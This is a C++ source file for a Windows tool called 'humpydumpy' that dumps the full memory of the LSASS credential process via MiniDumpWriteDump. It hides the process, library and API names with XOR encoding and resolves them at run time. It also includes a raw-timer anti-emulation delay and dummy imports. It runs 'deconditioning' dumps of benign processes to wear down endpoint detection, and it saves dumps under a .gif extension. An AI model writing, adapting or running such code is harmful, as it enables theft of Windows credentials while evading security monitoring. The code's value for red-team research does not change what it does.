#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <chrono>
#include <iostream>
#include <vector>

#include "processcache.h"

#pragma comment(lib, "dbghelp.lib")


// Change imports

void bla1() {
    MessageBoxA(NULL, "Hello", "World", MB_OK);
}

void bla2() {
    HINSTANCE hInstance = NULL;
    HWND hwnd = CreateWindowEx(
        0,                      // Extended window style (none)
        L"asdf",             // Window class name
        L"Minimal Windows App",  // Window title
        WS_OVERLAPPEDWINDOW,    // Window style (standard)
        CW_USEDEFAULT, CW_USEDEFAULT, // Position (default)
        500, 300,               // Size (width, height)
        NULL,                   // Parent window (none)
        NULL,                   // Menu (none)
        hInstance,              // Instance handle
        NULL                    // Additional application data
    );
}

void bla3() {
    HKEY hKey;
    RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0,
        KEY_READ, // Access rights
        &hKey     // Output handle to the opened key
    );
}


// Anti Emulation

// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

void sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}


// Dynamic API Import

typedef BOOL(WINAPI* MyDumpPtr)(
    HANDLE        hProcess,
    DWORD         ProcessId,
    HANDLE        hFile,
    MINIDUMP_TYPE DumpType,
    PVOID         ExceptionParam,
    PVOID         UserStreamParam,
    PVOID         CallbackParam
    );

MyDumpPtr MiniDWriteD = NULL;

bool resolve_func() {
    // dbghelp.dll\0
    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
    BYTE dumpLibraryBytes[] = { 0x25,0x21,0x26,0x2b,0x24,0x2f,0x31,0x6d,0x25,0x2f,0x2d,0x43 };
    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }

    // MiniDumpWriteDump\0
    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
    BYTE dumpFunctionBytes[] = { 0x0c,0x2a,0x2f,0x2a,0x05,0x36,0x2c,0x33,0x16,0x31,0x28,0x37,0x24,0x07,0x34,0x2e,0x31,0x43 };
    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }

    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);

    // resolving functions
    HMODULE hLib = LoadLibraryA(dumpLibrary);
    if (!hLib) {
        std::cerr << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
        return false;
    }
    MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
    if (!MiniDWriteD) {
        std::cerr << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
        return false;
    }

    return true;
}


bool dump_process(DWORD pid) {
    std::string dumpFileName = std::to_string(pid) + ".gif";

    HANDLE hFile = CreateFileA(dumpFileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "  Failed to open dump file: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "  Failed to open process: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return false;
    }

    std::cout << "  Success OpenProcess()" << std::endl;

    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        std::cerr << "  Failed to create dump: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "  Dump created successfully\n";

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return true;
}


void deconditioning(unsigned int deconDumps) {
    std::vector<std::wstring> procsDump = {
        //L"ctfmon.exe", L"explorer.exe", L"ShellHost.exe", L"audiodg.exe"
        L"conhost.exe", L"cmd.exe", L"StartMenuExperienceHost.exe", L"ctfmon.exe"  // user processes
        , L"explorer.exe"
    };

    for (int i = 0; i < deconDumps; i++) {
        DWORD pid = ProcessCache::GetPid(procsDump[i % procsDump.size()]);
        std::wcout << L"Deconditioning dump for " << std::wstring(procsDump[i % procsDump.size()]) << L" with pid " << pid << std::endl;
        dump_process(pid);
    }
}


void dump_ls4ss() {
    // ls4ss.exe\0
    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE procBytes[] = { 0x2d,0x43,0x32,0x43,0x20,0x43,0x32,0x43,0x32,0x43,0x6f,0x43,0x24,0x43,0x39,0x43,0x24,0x43,0x41,0x43 };
    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);

    DWORD lsa4sPid = ProcessCache::GetPid(procW);
    if (lsa4sPid != 0) {
        std::cout << "Dumping ls4ss.exe with pid " << lsa4sPid << std::endl;
        if (dump_process(lsa4sPid)) {
            std::cout << "  ls4ss.exe dumped successfully with pid " << lsa4sPid << std::endl;
        }
        else {
            std::cerr << "  Failed to dump ls4ss.exe with pid " << lsa4sPid << std::endl;
        }
    }
    else {
        std::cerr << "  ls4ss.exe not found\n";
    }
}


int main(int argc, char* argv[]) {
    bool deconditioning_flag = false;
    bool dump_ls4ss_flag = false;
    if (argc != 3) {
        std::cout << "Usage: humpydumpy <deconditioning> <dumpls4ss>\n";
        return 1;
    }
    else {
        if (argv[1][0] == '1') {
            deconditioning_flag = true;
        }
        if (argv[2][0] == '1') {
            dump_ls4ss_flag = true;
        }
    }

    std::cout << "1 Start\n";
    //antiemulation();

    std::cout << "2 Resolve\n";
    if (!resolve_func()) {
        std::cerr << "Failed to resolve functions\n";
        return 1;
    }

    if (deconditioning_flag) {
        std::cout << "3 Decon\n";
        deconditioning(20);
    }

    if (dump_ls4ss_flag) {
        std::cout << "Dumping ls4ss\n";
        dump_ls4ss();
    }
    else {
        std::cout << "Didnt dump ls4ss\n";
    }

    std::cout << "End\n";

    // Make sure functions stay in
    if (argc == 42) {
        bla1();
        bla2();
        bla3();
    }

    return 0;
}
